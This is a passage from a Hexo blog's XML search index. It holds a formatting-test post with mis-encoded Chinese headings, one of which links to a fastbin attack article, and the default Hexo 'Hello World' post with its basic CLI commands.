        <content type="html"><![CDATA[<h1 id="ä¸€çº§æ ‡é¢˜"><a href="#ä¸€çº§æ ‡é¢˜" class="headerlink" title="ä¸€çº§æ ‡é¢˜"></a>ä¸€çº§æ ‡é¢˜</h1><h2 id="ä»£ç æµ‹è¯•ï¼š"><a href="#ä»£ç æµ‹è¯•ï¼š" class="headerlink" title="ä»£ç æµ‹è¯•ï¼š"></a>ä»£ç æµ‹è¯•ï¼š</h2><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="å›¾ç‰‡æµ‹è¯•ï¼š"><a href="#å›¾ç‰‡æµ‹è¯•ï¼š" class="headerlink" title="å›¾ç‰‡æµ‹è¯•ï¼š"></a>å›¾ç‰‡æµ‹è¯•ï¼š</h2><p><img lazyload src="/images/loading.svg" data-src="/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/ceshi.jpg" alt="ceshi"></p><h2 id="å¼•ç”¨æµ‹è¯•"><a href="#å¼•ç”¨æµ‹è¯•" class="headerlink" title="å¼•ç”¨æµ‹è¯•"></a>å¼•ç”¨æµ‹è¯•</h2><blockquote><p>ä½ å¥½,è¿™æ˜¯ä¸€æ¡å¼•ç”¨</p></blockquote><h2 id="é“¾æ¥æµ‹è¯•"><a href="#é“¾æ¥æµ‹è¯•" class="headerlink" title="é“¾æ¥æµ‹è¯•"></a>é“¾æ¥æµ‹è¯•</h2><ul><li>è¿™æ˜¯fastbin_attackæ–‡ç« é“¾æ¥<br> &lt;<a class="link" href="https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#">https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc# <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &gt;</li></ul><h2 id="æ— åºåˆ—è¡¨æµ‹è¯•"><a href="#æ— åºåˆ—è¡¨æµ‹è¯•" class="headerlink" title="æ— åºåˆ—è¡¨æµ‹è¯•"></a>æ— åºåˆ—è¡¨æµ‹è¯•</h2><ul><li>å°å‘</li><li>å°ç½—</li><li>å¤§å‘</li></ul><h3 id="ä¸‰çº§æ ‡é¢˜"><a href="#ä¸‰çº§æ ‡é¢˜" class="headerlink" title="ä¸‰çº§æ ‡é¢˜"></a>ä¸‰çº§æ ‡é¢˜</h3><h4 id="å››çº§æ ‡é¢˜"><a href="#å››çº§æ ‡é¢˜" class="headerlink" title="å››çº§æ ‡é¢˜"></a>å››çº§æ ‡é¢˜</h4>]]></content>
      
      
      
        <tags>
            
            <tag> æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/20/hello-world/"/>
      <url>/2024/08/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a class="link" href="https://hexo.io/">Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link" href="https://hexo.io/docs/">documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link" href="https://hexo.io/docs/troubleshooting.html">troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link" href="https://github.com/hexojs/hexo/issues">GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div><p>More info: <a class="link" href="https://hexo.io/docs/writing.html">Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div><p>More info: <a class="link" href="https://hexo.io/docs/server.html">Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div><p>More info: <a class="link" href="https://hexo.io/docs/generating.html">Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div><p>More info: <a class="link" href="https://hexo.io/docs/one-command-deployment.html">Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
